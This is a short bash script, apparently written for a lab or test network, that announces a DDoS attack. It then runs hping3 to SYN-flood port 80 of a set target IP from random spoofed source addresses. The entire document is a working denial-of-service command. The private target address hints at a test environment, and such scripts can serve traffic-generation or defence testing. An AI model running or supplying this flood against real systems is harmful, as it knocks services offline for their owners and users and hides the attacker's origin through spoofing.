#!/bin/bash

TARGET_IP="172.30.0.2"

echo "[*] Launching DDoS Attack using hping3..."
hping3 -S --flood --rand-source -p 80 $TARGET_IP
